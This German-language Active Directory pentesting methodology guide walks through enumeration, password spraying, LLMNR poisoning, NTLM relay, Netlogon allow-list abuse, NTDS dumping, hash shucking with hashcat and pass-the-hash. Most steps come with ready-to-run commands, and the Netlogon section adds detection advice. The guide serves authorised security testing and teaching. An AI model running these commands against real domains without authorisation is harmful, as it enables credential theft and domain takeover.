# Active-Directory-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** ist eine grundlegende Technologie, mit der **Netzwerkadministratoren** effizient **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks erstellen und verwalten können. Sie ist skalierbar ausgelegt und ermöglicht es, eine große Anzahl von Benutzern in überschaubare **Gruppen** und **Untergruppen** zu organisieren und gleichzeitig **Zugriffsrechte** auf verschiedenen Ebenen zu steuern.

Die Struktur von **Active Directory** besteht aus drei Hauptschichten: **Domänen**, **Bäumen** und **Gesamtstrukturen**. Eine **Domäne** umfasst eine Sammlung von Objekten wie **Benutzern** oder **Geräten**, die eine gemeinsame Datenbank nutzen. **Bäume** sind Gruppen solcher Domänen, die durch eine gemeinsame Struktur verbunden sind. Eine **Gesamtstruktur** umfasst mehrere Bäume, die über **Vertrauensstellungen** miteinander verbunden sind, und bildet die oberste Ebene der Organisationsstruktur. Auf jeder dieser Ebenen lassen sich bestimmte **Zugriffs-** und **Kommunikationsrechte** festlegen.

Zu den wichtigsten Konzepten in **Active Directory** gehören:

1. **Verzeichnis** – Enthält alle Informationen zu Active-Directory-Objekten.
2. **Objekt** – Bezeichnet Entitäten im Verzeichnis, darunter **Benutzer**, **Gruppen** oder **freigegebene Ordner**.
3. **Domäne** – Dient als Container für Verzeichnisobjekte. In einer **Gesamtstruktur** können mehrere Domänen nebeneinander bestehen, von denen jede ihre eigene Objektsammlung verwaltet.
4. **Baum** – Eine Gruppe von Domänen mit einer gemeinsamen Stammdomäne.
5. **Gesamtstruktur** – Die oberste Ebene der Organisationsstruktur in Active Directory. Sie besteht aus mehreren Bäumen, zwischen denen **Vertrauensstellungen** bestehen.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Dazu gehören:

1. **Domänendienste** – Zentralisieren die Datenspeicherung und verwalten die Interaktionen zwischen **Benutzern** und **Domänen**, einschließlich **Authentifizierungs-** und **Suchfunktionen**.
2. **Zertifikatdienste** – Verwalten die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützen verzeichnisfähige Anwendungen über das **LDAP-Protokoll**.
4. **Directory Federation Services** – Bieten **Single-Sign-on**-Funktionen, mit denen Benutzer während einer Sitzung über mehrere Webanwendungen hinweg authentifiziert werden können.
5. **Rights Management** – Hilft, urheberrechtlich geschütztes Material zu schützen, indem dessen unbefugte Verbreitung und Nutzung eingeschränkt wird.
6. **DNS Service** – Ist entscheidend für die Auflösung von **Domänennamen**.

Eine ausführlichere Erklärung findest du unter: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos-Authentifizierung**

Um zu lernen, wie man **ein AD angreift**, musst du den **Kerberos-Authentifizierungsprozess** sehr gut **verstehen**.\
[**Lies diese Seite, wenn du noch nicht weißt, wie er funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Unter [https://wadcoms.github.io/](https://wadcoms.github.io) findest du eine Übersicht darüber, welche Befehle du zum Enumerieren/Exploitieren eines AD ausführen kannst.

> [!WARNING]
> Die Kerberos-Kommunikation **erfordert normalerweise einen vollständig qualifizierten Domänennamen (FQDN)**, damit der Client ein Ticket für den richtigen SPN abrufen kann. Beim Zugriff auf einen Rechner über eine IP-Adresse wird häufig auf NTLM statt auf Kerberos zurückgegriffen.

## Active Directory Recon (ohne Credentials/Sitzungen)

Wenn du Zugriff auf eine AD-Umgebung hast, aber keine Credentials/Sitzungen besitzt, kannst du:

- **Das Netzwerk pentesten:**
  - Scanne das Netzwerk, finde Rechner und offene Ports und versuche, **Schwachstellen auszunutzen** oder **Credentials zu extrahieren** (zum Beispiel können [Drucker sehr interessante Ziele sein](ad-information-in-printers.md)).
  - DNS-Enumeration kann Informationen über wichtige Server in der Domäne liefern, etwa Webserver, Drucker, Freigaben, VPN, Medienserver usw.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Sieh dir die allgemeine [**Pentesting-Methodik**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um weitere Informationen zur Durchführung zu erhalten.
- **Prüfe auf Null- und Guest-Zugriff auf SMB-Diensten** (dies funktioniert nicht mit modernen Windows-Versionen):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Eine ausführlichere Anleitung zur Enumeration eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP enumerieren**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Eine ausführlichere Anleitung zur LDAP-Enumeration findest du hier (achte besonders auf den **anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Das Netzwerk vergiften**
  - Sammle Credentials, indem du [**Dienste mit Responder imitierst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Greife auf Hosts zu, indem du [**den Relay-Angriff ausnutzt**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Sammle Credentials, indem du [**gefälschte UPnP-Dienste mit evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **offenlegst**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extrahiere Benutzernamen/Namen aus internen Dokumenten, sozialen Medien und Diensten (hauptsächlich Webdiensten) innerhalb der Domänenumgebungen sowie aus öffentlich verfügbaren Quellen.
  - Wenn du die vollständigen Namen von Mitarbeitern des Unternehmens findest, kannst du verschiedene AD-**Benutzernamenkonventionen** ausprobieren (**[lies dies](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Die gängigsten Konventionen sind: _VornameNachname_, _Vorname.Nachname_, _VorNach_ (jeweils 3 Buchstaben), _Vor.Nach_, _VNachname_, _V.Nachname_, _NachnameVorname_, _Nachname.Vorname_, _NachnameV_, _Nachname.V_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
  - Tools:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Benutzer-Enumeration

- **Anonyme SMB-/LDAP-Enumeration:** Sieh dir die Seiten zu [**Pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**Pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) an.
- **Kerbrute-Enumeration**: Wird ein **ungültiger Benutzername angefordert**, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_. So können wir feststellen, dass der Benutzername ungültig ist. Bei **gültigen Benutzernamen** wird entweder das **TGT in einer AS-REP**-Antwort oder der Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ zurückgegeben, der anzeigt, dass der Benutzer eine Präauthentifizierung durchführen muss.
- **Keine Authentifizierung über MS-NRPC**: Dabei wird auth-level = 1 (keine Authentifizierung) für die MS-NRPC- (Netlogon-)Schnittstelle auf Domänencontrollern verwendet. Nach dem Binden an die MS-NRPC-Schnittstelle ruft die Methode die Funktion `DsrGetDcNameEx2` auf, um ohne Credentials zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Forschung ist [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> zu finden.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch **user enumeration gegen ihn durchführen**. Zum Beispiel könntest du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Listen mit Benutzernamen findest du in [**diesem GitHub-Repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) und in diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Allerdings solltest du die **Namen der Personen kennen, die im Unternehmen arbeiten** – diese solltest du beim Recon-Schritt ermittelt haben, den du zuvor durchgeführt haben solltest. Mit Vor- und Nachnamen kannst du das Skript [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Auch wenn **Zerologon** auf dem DC gepatcht ist, können explizit auf die Allowlist gesetzte Konten weiterhin durch **veraltetes/verwundbares Netlogon-Secure-Channel-Verhalten** gefährdet sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der entsprechende Registrierungswert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Dieser Wert ist ein **SDDL-Sicherheitsdeskriptor** (siehe [Security Descriptors](security-descriptors.md)). Jedes Konto oder jede Gruppe, dem bzw. der der entsprechende ACE in der DACL gewährt wird, kann zum Ziel werden. Zum Beispiel setzt `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone** auf die Allowlist.

Praktischer Ablauf für Operatoren:

1. **Ermittle die auf der Allowlist stehenden Principals**, indem du sowohl **SYSVOL/GPO** als auch die **Live-Registrierung des DC** überprüfst.
2. **Löse die in der SDDL gefundenen SIDs auf**, um die zugehörigen AD-Benutzer und -Computer zu ermitteln, und priorisiere **DC-Computerkonten**, **Trust-Konten** und andere privilegierte Computer.
3. Versuche wiederholt eine **MS-NRPC-/Netlogon-Authentifizierung** als das auf der Allowlist stehende Konto.
4. Missbrauche nach einem erfolgreichen Treffer das **Netlogon-Passwortsetzen**, um das Passwort des Zielkontos zurückzusetzen (der öffentliche PoC setzt es auf eine leere Zeichenfolge).<sup>[[9]](#references)[[10]](#references)</sup>

Schnelle Triage-/Lab-Beispiele aus dem öffentlichen Artefakt:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Hinweise:

- Der **scanner** ist nützlich, weil die effektive Allowlist in **SYSVOL**, in der **registry** oder an beiden Orten vorhanden sein kann.
- Der Exploit-Pfad selbst ist wichtig, weil er **keine Domain-Admin-Berechtigungen erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Die Kompromittierung eines **Domain Controller-Machine-Accounts** wie `DC$` ist besonders gefährlich, da das Zurücksetzen des Passworts direkt umfassendere **AD-Takeover**-Pfade ermöglichen kann.
- Ob **Brute-Force** praktikabel ist, hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen Meet-in-the-middle-Ansatz, einen **24-Bit**-Brute-Force-Angriff, wenn ein weiteres Computer-Konto verfügbar ist, sowie langsamere **32-Bit**-Varianten.

Hinweise zur Erkennung und Härtung:

- Überprüfen Sie die Allowlist-Richtlinie und entfernen Sie alle Einträge außer vorübergehenden, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwachen Sie auf DCs die **System**-Ereignisse **5827/5828/5829/5830/5831**, um zu erkennen, wenn verwundbare Netlogon-Verbindungen verweigert, entdeckt oder durch Richtlinien ausdrücklich zugelassen werden.
- Behandeln Sie Konten in `VulnerableChannelAllowList` als **hochriskant**, bis die Abhängigkeit von der veralteten Komponente beseitigt ist.

### Einen oder mehrere Benutzernamen kennen

Okay, Sie wissen also, dass Sie bereits einen gültigen Benutzernamen haben, aber keine Passwörter ... Versuchen Sie dann Folgendes:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer das Attribut _DONT_REQ_PREAUTH_ **nicht besitzt**, können Sie für diesen Benutzer eine **AS_REP-Nachricht anfordern**, die Daten enthält, die mit einer Ableitung des Benutzerpassworts verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuchen Sie, die **häufigsten Passwörter** mit jedem der gefundenen Benutzer auszuprobieren. Vielleicht verwendet ein Benutzer ein schwaches Passwort (beachten Sie die Passwortrichtlinie!).
  - Beachten Sie, dass Sie auch **OWA-Server sprühen** können, um Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise können Sie **Challenge-Hashes erhalten**, indem Sie einige Netzwerkprotokolle **poisonen**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Die Active-Directory-Aufzählung liefert Benutzernamen, E-Mail-Kennungen und Namensmuster, mögliche Zielhosts sowie Dienste, zu deren Authentifizierung eine Verbindung erzwungen werden kann. Nutzen Sie diesen Kontext, um geeignete [**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) und mögliche Einstiegspfade in die AD-Umgebung zu identifizieren.

### NetExec: workspace-gestützte Reconnaissance und Prüfungen der Relay-Sicherheit

- Verwenden Sie **`nxcdb`-Workspaces**, um den AD-Reconnaissance-Status pro Engagement zu speichern: `workspace create <name>` erstellt protokollspezifische SQLite-Datenbanken unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap usw.). Wechseln Sie die Ansichten mit `proto smb|mssql|winrm` und listen Sie gesammelte Secrets mit `creds` auf. Löschen Sie sensible Daten anschließend manuell: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Eine schnelle Subnetz-Erkennung mit **`netexec smb <cidr>`** zeigt **Domain**, **OS-Build**, **SMB-Signaturanforderungen** und **Null Auth**. Hosts mit `(signing:False)` sind **anfällig für Relay-Angriffe**, während DCs häufig eine Signatur verlangen.
- Erzeugen Sie direkt aus der NetExec-Ausgabe **Hostnamen in /etc/hosts**, um das Targeting zu vereinfachen:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wenn **SMB relay zum DC durch signing blockiert wird**, sollte trotzdem die **LDAP**-Konfiguration geprüft werden: `netexec ldap <dc>` weist auf `(signing:None)` / schwaches channel binding hin. Ein DC, bei dem SMB signing erforderlich, LDAP signing aber deaktiviert ist, bleibt ein geeignetes **relay-to-LDAP**-Ziel für Angriffe wie **SPN-less RBCD**.

### Client-seitige Drucker-Credential-leaks → bulk domain credential validation

- Drucker-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Das Anzeigen des Quelltexts über die DevTools kann Klartext offenlegen (z. B. `<input value="<password>">`) und so Basic-auth-Zugriff auf Scan-/Druck-Repositories ermöglichen.
- Abgerufene Druckaufträge können **Onboarding-Dokumente im Klartext** mit benutzerspezifischen Passwörtern enthalten. Beim Testen müssen die Zuordnungen erhalten bleiben:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM-Credentials stehlen

Wenn du **auf andere PCs oder Freigaben zugreifen** kannst, indem du den **null- oder guest-Benutzer** verwendest, könntest du **Dateien ablegen** (z. B. eine SCF-Datei), die, falls sie auf irgendeine Weise aufgerufen werden, eine NTLM-Authentifizierung gegen dich **auslösen**, sodass du die **NTLM-Challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash Shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos-RC4-Tickets, NetNTLM-Challenges oder zwischengespeicherten Credentials per Brute-Force zu knacken, übergibst du die NT-Hashes an Hashcats NT-Candidate-Modi und lässt damit die Wiederverwendung von Passwörtern überprüfen, ohne jemals den Klartext zu erfahren. Besonders wirkungsvoll ist das nach einer Domain-Kompromittierung, bei der du Tausende aktuelle und historische NT-Hashes sammeln kannst.<sup>[[5]](#references)</sup>

Nutze Shucking, wenn:

- Du einen NT-Hash-Bestand aus DCSync, SAM/SECURITY-Dumps oder Credential-Vaults hast und auf Wiederverwendung in anderen Domains/Forests testen musst.
- Du RC4-basiertes Kerberos-Material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Antworten oder DCC/DCC2-Blobs abfängst.
- Du die Wiederverwendung langer, nicht zu knackender Passphrasen schnell nachweisen und sofort per Pass-the-Hash pivotieren möchtest.

Die Technik **funktioniert nicht** bei Verschlüsselungstypen, deren Schlüssel nicht der NT-Hash ist (z. B. Kerberos etype 17/18 AES). Wenn eine Domain ausschließlich AES erzwingt, musst du auf die regulären Passwortmodi zurückgreifen.

#### Einen NT-Hash-Bestand erstellen

- **DCSync/NTDS** – Verwende `secretsdump.py` mit dem History-Argument, um möglichst viele NT-Hashes (und ihre vorherigen Werte) zu sammeln:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Verlaufsdaten erweitern den Kandidatenpool erheblich, da Microsoft bis zu 24 vorherige Hashes pro Konto speichern kann. Weitere Möglichkeiten, NTDS-Secrets zu sammeln, findest du hier:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-Cache-Dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM-/SECURITY-Daten und zwischengespeicherte Domain-Logons (DCC/DCC2). Entferne Duplikate und füge diese Hashes derselben Liste `nt_candidates.txt` hinzu.
- **Metadaten erfassen** – Bewahre den Benutzernamen/die Domain auf, die zu jedem Hash gehören (auch wenn die Wordlist nur Hex-Werte enthält). Sobald Hashcat den passenden Kandidaten ausgibt, zeigen übereinstimmende Hashes sofort, welcher Principal ein Passwort wiederverwendet.
- Bevorzuge Kandidaten aus derselben Forest oder einer vertrauenswürdigen Forest; das maximiert beim Shucking die Wahrscheinlichkeit einer Überschneidung.

#### Hashcat-NT-Kandidatenmodi

| Hash-Typ                                | Passwortmodus | NT-Kandidatenmodus |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Hinweise:

- NT-Kandidaten-Eingaben **müssen rohe NT-Hashes mit 32 Hex-Zeichen bleiben**. Deaktiviere Rule-Engines (kein `-r`, keine Hybrid-Modi), da Manipulationen das Schlüsselmaterial der Kandidaten beschädigen.
- Diese Modi sind nicht grundsätzlich schneller, aber der NTLM-Schlüsselraum (~30,000 MH/s auf einem M3 Max) ist etwa 100-mal schneller als Kerberos RC4 (~300 MH/s). Eine kuratierte NT-Liste zu testen ist deutlich günstiger, als den gesamten Passwort-Raum im langsameren Format zu durchsuchen.
- Verwende immer den **neuesten Hashcat-Build** (`git clone https://github.com/hashcat/hashcat && make install`), da die Modi 31500/31600/35300/35400 erst kürzlich hinzugefügt wurden.<sup>[[7]](#references)</sup>
- Derzeit gibt es keinen NT-Modus für AS-REQ Pre-Auth, und AES-Etypes (19600/19700) erfordern das Klartextpasswort, da ihre Schlüssel per PBKDF2 aus UTF-16LE-Passwörtern abgeleitet werden und nicht aus rohen NT-Hashes.

#### Beispiel – Kerberoast RC4 (Modus 35300)

1. Erfasse ein RC4-TGS für einen Ziel-SPN mit einem Benutzer mit geringen Berechtigungen (Details findest du auf der Kerberoast-Seite):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shucke das Ticket mit deiner NT-Liste:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat leitet den RC4-Schlüssel aus jedem NT-Kandidaten ab und validiert den `$krb5tgs$23$...`-Blob. Ein Treffer bestätigt, dass das Dienstkonto einen deiner vorhandenen NT-Hashes verwendet.

3. Wechsle sofort zu PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Bei Bedarf kannst du den Klartext später mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen.

#### Beispiel – Zwischengespeicherte Anmeldedaten (mode 31600)

1. Zwischengespeicherte Logons von einer kompromittierten Workstation auslesen:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopiere die DCC2-Zeile des interessanten Domänenbenutzers in `dcc2_highpriv.txt` und shucke sie:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Ein erfolgreicher Treffer ergibt den NT-Hash, der bereits in deiner Liste steht, und beweist damit, dass der gecachte Benutzer ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder führe einen Brute-Force-Angriff im schnellen NTLM-Modus aus, um den Klartext zu ermitteln.

Derselbe Workflow gilt für NetNTLM-Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald ein Treffer gefunden wurde, kannst du Relay oder SMB/WMI/WinRM PtH starten oder den NT-Hash offline erneut mit Masks/Rules cracken.



## Enumerieren von Active Directory MIT Credentials/Session

Für diese Phase musst du **die Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert haben.** Wenn du gültige Credentials oder eine Shell als Domain-User hast, **solltest du bedenken, dass die zuvor genannten Optionen weiterhin Möglichkeiten sind, andere Benutzer zu kompromittieren.**

Bevor du mit der authentifizierten Enumeration beginnst, solltest du das **Kerberos-Double-Hop-Problem** verstehen.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Einen Account zu kompromittieren ist ein **wichtiger Schritt bei der Bewertung der Domain**, da es eine authentifizierte **Active-Directory-Enumeration** ermöglicht:

In Bezug auf [**ASREPRoast**](asreproast.md) kannst du nun alle potenziell verwundbaren Benutzer finden. Mit [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Usernames** erhalten und das Passwort des kompromittierten Accounts, leere Passwörter und neue vielversprechende Passwörter ausprobieren.

- Du kannst [**CMD für grundlegende Recon verwenden**](../basic-cmd-for-pentesters.md#domain-info)
- Du kannst auch [**PowerShell für Recon verwenden**](../basic-powershell-for-pentesters/index.html); das ist unauffälliger
- Mit [**powerview**](../basic-powershell-for-pentesters/powerview.md) kannst du weitere detaillierte Informationen extrahieren
- Ein weiteres großartiges Tool für Recon in einem Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht besonders unauffällig** (je nach verwendeten Collection-Methoden). **Wenn dir das egal ist**, solltest du es unbedingt ausprobieren. Finde heraus, wo sich Benutzer per RDP anmelden können, und ermittle Pfade zu anderen Gruppen usw.
  - **Weitere automatisierte AD-Enumeration-Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Prüfe die [**DNS-Records des AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, mit dem du das Verzeichnis enumerieren kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch mit **ldapsearch** in der LDAP-Datenbank nach Credentials in den Feldern _userPassword_ und _unixUserPassword_ oder in den Notizen _description_ und _info_ von Benutzern suchen. Ein nicht gekennzeichneter, passwortähnlicher Wert in _info_ ist zunächst nur ein möglicher Kandidat: Bestätige seinen Zweck und seine Gültigkeit separat und gib den Inhalt der Notizen bei routinemäßiger Enumeration nicht aus. Weitere Methoden findest du unter [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Prüfe zugängliche Anmeldeskripte und Skripte zur Laufwerkszuordnung der Domain unter `\\<dc>\NETLOGON` oder `\\<dc>\SYSVOL\<domain>\scripts`, sofern die Berechtigungen dies erlauben. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) die Funktion der NETLOGON-Freigabe als Skriptverzeichnis. Liste zuerst die Namen auf und prüfe anschließend nur relevante, lesbare Skripte innerhalb eines Größenlimits. Gib nicht die gesamte Freigabe aus und zeige bei der routinemäßigen Enumeration keine Credential-Werte an. Ein PowerShell-Aufruf von [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **schützt** ein im Skript gespeichertes Klartextpasswort **nicht**. Der Aufruf allein beweist nicht, dass ein Secret fest codiert ist: Verfolge die tatsächliche Eingabe und überprüfe anschließend separat den Account, die Gültigkeit der Credentials und die Berechtigungen. Die Prüfung eines Domain-Skripts auf einer Remote-Freigabe ist von der Enumeration des lokalen Hosts getrennt.
- Wenn du **Linux** verwendest, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du kannst auch automatisierte Tools ausprobieren, zum Beispiel:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-Benutzer extrahieren**

  Unter Windows lassen sich alle Domain-Usernames sehr einfach ermitteln (`net user /domain` ,`Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Abschnitt zur Enumeration kurz wirkt, ist er der wichtigste Teil überhaupt. Öffne die Links (vor allem zu CMD, PowerShell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Bei einem Assessment ist dies der entscheidende Moment, um einen Weg zu DA zu finden oder festzustellen, dass nichts zu machen ist.

### Vorhersagbare vorab erstellte Computer-Accounts -> Zugriff auf gMSA-Passwörter

Computer-Accounts, die für Legacy-Joins vorbereitet wurden, können ein vorhersagbares initiales Passwort behalten. Das `pre2k`-Modul von NetExec identifiziert den charakteristischen `userAccountControl`-Wert `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) und versucht, mit den ersten 14 Zeichen des kleingeschriebenen Computernamens, ohne das abschließende `$`, ein Kerberos-TGT abzurufen. Behandle diesen UAC-Wert als Filter zur Auswahl möglicher Kandidaten, statt anzunehmen, dass die Mitgliedschaft in **Pre-Windows 2000 Compatible Access** allein ein schwaches Passwort beweist.<sup>[[18]](#references)[[20]](#references)</sup>

Verwende eine authentifizierte LDAP-Enumeration, um die Kandidaten zu prüfen und erfolgreiche TGTs zu speichern. `ALL=True` erweitert die Tests auf Objekte, die nicht dem Standardfilter `4128` entsprechen.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

